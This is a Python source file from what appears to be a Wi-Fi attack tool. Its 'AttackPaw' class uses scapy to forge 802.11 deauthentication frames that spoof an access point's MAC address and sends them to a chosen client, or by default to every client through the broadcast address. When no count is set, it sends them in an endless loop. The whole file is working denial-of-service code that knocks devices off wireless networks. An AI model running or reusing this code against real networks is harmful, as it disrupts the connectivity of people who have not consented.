from paws.util_paw import UtilPaw
import platform
if platform.system() == 'Darwin':
    from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
else:
    from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
    from scapy.sendrecv import sendp

class AttackPaw:

    __util_paw = None

    # general
    _verbose = False

    # deauth
    _interface = ''
    _target_mac = ''
    _target_network_mac = ''
    _interval = .1
    _count = 0

    def __init__(self, util_paw: UtilPaw) -> None:
        self.__util_paw = util_paw

    def set_verbose(self, verbose: bool) -> None:
        self._verbose = verbose

    def set_target_network_mac(self, target_network_mac: str) -> None:
        self._target_network_mac  = target_network_mac

    def set_target_mac(self, target_mac: str) -> None:
        self._target_mac = 'ff:ff:ff:ff:ff:ff' if not target_mac else target_mac # if target_mac not defined use broadcast

    def set_interface(self, interface: str) -> None:
        self._interface = interface
    
    def set_interval(self, interval: float) -> None:
        self._interval = interval

    def set_count(self, count: int) -> None:
        self._count = count
    
    def deauth(self) -> None:

        # 802.11 frame
        dot11 = Dot11(
            addr1=self._target_mac, # destination MAC
            addr2=self._target_network_mac, # source MAC
            addr3=self._target_network_mac, # Access Point MAC
        )
        # stack them up
        packet = RadioTap()/dot11/Dot11Deauth(reason=7)
        # send the packet
        sendp(
            x=packet,
            inter=self._interval,
            count=self._count,
            loop=not self._count,
            iface=self._interface,
            verbose=True,
        )
